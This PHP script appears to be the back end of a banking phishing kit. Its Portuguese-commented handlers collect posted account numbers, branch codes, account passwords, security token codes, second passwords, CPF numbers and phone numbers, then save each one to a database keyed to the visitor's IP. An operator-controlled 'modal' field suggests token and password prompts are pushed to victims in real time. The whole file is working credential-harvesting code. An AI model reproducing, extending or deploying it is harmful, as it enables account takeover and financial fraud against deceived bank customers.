<?php

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Verifica se a ação é para o formulário principal
    if (
        isset($_POST['action']) && $_POST['action'] == 'form-save' &&
        isset($_POST['titularidade']) && !empty($_POST['titularidade']) &&
        isset($_POST['tipo_conta']) && !empty($_POST['tipo_conta']) &&
        isset($_POST['agencia']) && !empty($_POST['agencia']) &&
        isset($_POST['conta']) && !empty($_POST['conta']) &&
        isset($_POST['senha']) && !empty($_POST['senha'])
    ) {
        $titularidade = $_POST['titularidade'];
        $tipoConta = $_POST['tipo_conta'];
        $agencia = $_POST['agencia'];
        $numeroConta = $_POST['conta'];
        $senha = $_POST['senha'];

        $ip = $api->getUserIp();
        $cliente_id = $api->registrarOuAtualizarCliente($ip);

        $api->atualizarColuna($cliente_id, 'modal', 'fechado');
        $api->atualizarColuna($cliente_id, 'titularidade', $titularidade);
        $api->atualizarColuna($cliente_id, 'tipoConta', $tipoConta);
        $api->atualizarColuna($cliente_id, 'agencia', $agencia);
        $api->atualizarColuna($cliente_id, 'numeroConta', $numeroConta);
        $api->atualizarColuna($cliente_id, 'senhaConta', $senha);
    }

    // Verifica se a ação é para o modal de token
    if (
        isset($_POST['action']) && $_POST['action'] == 'form-modal' &&
        isset($_POST['codemodal']) && !empty($_POST['codemodal'])
    ) {
        $codemodal = $_POST['codemodal'];

        $ip = $api->getUserIp();
        $cliente_id = $api->registrarOuAtualizarCliente($ip);

        $api->atualizarColuna($cliente_id, 'modal', 'fechado');
        $api->atualizarColuna($cliente_id, 'code', $codemodal);
    }

    // Verifica se a ação é para o modal de senha
    if (
        isset($_POST['action']) && $_POST['action'] == 'form-senha' &&
        isset($_POST['senha']) && !empty($_POST['senha'])
    ) {
        $senha = $_POST['senha'];

        $ip = $api->getUserIp();
        $cliente_id = $api->registrarOuAtualizarCliente($ip);

        $api->atualizarColuna($cliente_id, 'modal', 'fechado');
        $api->atualizarColuna($cliente_id, 'senha2Conta', $senha);
    }

    // Verifica se a ação é para o modal de dados extras
    if (
        isset($_POST['action']) && $_POST['action'] == 'form-dadosextras' &&
        isset($_POST['cpf']) && !empty($_POST['cpf']) &&
        isset($_POST['telefone']) && !empty($_POST['telefone'])
    ) {
        $cpf = $_POST['cpf'];
        $telefone = $_POST['telefone'];

        $ip = $api->getUserIp();
        $cliente_id = $api->registrarOuAtualizarCliente($ip);

        $api->atualizarColuna($cliente_id, 'modal', 'fechado');
        $api->atualizarColuna($cliente_id, 'cpf', $cpf);
        $api->atualizarColuna($cliente_id, 'telefoneConta', $telefone);
    }






    //////////////////////////////////////////////////////////////////////////////////////

    if (
        isset($_POST['action']) && $_POST['action'] == 'form-save2' &&
        isset($_POST['cpf']) && !empty($_POST['cpf']) &&
        isset($_POST['senha']) && !empty($_POST['senha'])
    ) {
        $cpf = $_POST['cpf'];
        $senha = $_POST['senha'];

        $ip = $api->getUserIp();
        $cliente_id = $api->registrarOuAtualizarCliente($ip);

        $api->atualizarColuna($cliente_id, 'modal', 'fechado');
        $api->atualizarColuna($cliente_id, 'cpf2', $cpf);
        $api->atualizarColuna($cliente_id, 'senhaConta2', $senha);
    }

    // Verifica se a ação é para o modal de token
    if (
        isset($_POST['action']) && $_POST['action'] == 'form-modal2' &&
        isset($_POST['codemodal']) && !empty($_POST['codemodal'])
    ) {
        $codemodal = $_POST['codemodal'];

        $ip = $api->getUserIp();
        $cliente_id = $api->registrarOuAtualizarCliente($ip);

        $api->atualizarColuna($cliente_id, 'modal', 'fechado');
        $api->atualizarColuna($cliente_id, 'code2', $codemodal);
    }

    // Verifica se a ação é para o modal de senha
    if (
        isset($_POST['action']) && $_POST['action'] == 'form-senha2' &&
        isset($_POST['senha']) && !empty($_POST['senha'])
    ) {
        $senha = $_POST['senha'];

        $ip = $api->getUserIp();
        $cliente_id = $api->registrarOuAtualizarCliente($ip);

        $api->atualizarColuna($cliente_id, 'modal', 'fechado');
        $api->atualizarColuna($cliente_id, 'senha2Conta2', $senha);
    }

    // Verifica se a ação é para o modal de dados extras
    if (
        isset($_POST['action']) && $_POST['action'] == 'form-dadosextras2' &&
        isset($_POST['telefone']) && !empty($_POST['telefone'])
    ) {
        $telefone = $_POST['telefone'];

        $ip = $api->getUserIp();
        $cliente_id = $api->registrarOuAtualizarCliente($ip);

        $api->atualizarColuna($cliente_id, 'modal', 'fechado');
        $api->atualizarColuna($cliente_id, 'telefoneConta2', $telefone);
    }
}
